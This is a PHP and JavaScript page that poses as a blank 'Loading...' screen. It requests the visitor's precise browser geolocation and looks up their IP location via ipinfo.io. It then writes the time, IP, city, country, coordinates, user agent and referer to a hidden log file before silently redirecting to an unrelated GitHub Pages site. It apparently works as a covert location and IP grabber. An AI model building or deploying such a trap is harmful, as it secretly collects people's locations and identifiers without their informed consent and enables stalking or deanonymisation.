<?php

include 'db.php';

date_default_timezone_set('Asia/Kolkata');

// Get IP
function getUserIP() {
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipList = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        foreach ($ipList as $ip) {
            $ip = trim($ip);
            if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
                return $ip;
            }
        }
    }

    if (!empty($_SERVER['HTTP_CLIENT_IP']) && filter_var($_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP)) {
        return $_SERVER['HTTP_CLIENT_IP'];
    }

    return $_SERVER['REMOTE_ADDR'];
}

$ip = getUserIP();
$time = date("Y-m-d H:i:s");

$userLat = isset($_GET['lat']) ? $_GET['lat'] : null;
$userLon = isset($_GET['lon']) ? $_GET['lon'] : null;

$lat = "Unknown";
$lon = "Unknown";
$city = "Unknown";
$country = "Unknown";
$source = "ip";

// If browser provided location
if ($userLat !== null && $userLon !== null) {
    $lat = $userLat;
    $lon = $userLon;
    $source = "browser";
}

// ADD THIS BLOCK RIGHT HERE
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://ipinfo.io/{$ip}/json");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

$data = json_decode($response, true);

if ($data) {
    if (isset($data['city'])) {
        $city = $data['city'];
    }
    if (isset($data['country'])) {
        $country = $data['country'];
    }

    // Only override lat/lon if browser didn't provide it
    if (($userLat === null || $userLon === null) && isset($data['loc'])) {
        list($lat, $lon) = explode(",", $data['loc']);
    }
}

// ---- LOGGING PART ----
if ($userLat !== null || isset($_GET['fallback'])) {

    $logDir  = __DIR__ . '/private_logs';
    $logFile = $logDir . '/visitors.log';

    if (!is_dir($logDir)) {
        mkdir($logDir, 0755, true);
    }

    $agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    $referer = $_SERVER['HTTP_REFERER'] ?? 'Direct';

    $logLine = "Time: $time | Source: $source | IP: $ip | City: $city | Country: $country | Lat: $lat | Lon: $lon | Agent: $agent | Referer: $referer\n";

    file_put_contents($logFile, $logLine, FILE_APPEND);

    // ✅ REDIRECT ONLY AFTER LOGGING
    header("Location: https://shvtheamigo.github.io/FortiFi/");
    exit;
}

include 'detect.php';

?>

<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Loading...</title>
</head>
<body>

<script>
(function () {
    if (!("geolocation" in navigator)) {
        window.location.href = "?fallback=1";
        return;
    }

    navigator.geolocation.getCurrentPosition(
        function (pos) {
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            window.location.href = "?lat=" + lat + "&lon=" + lon;
        },
        function () {
            window.location.href = "?fallback=1";
        },
        {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
        }
    );
})();
</script>

</body>
</html>
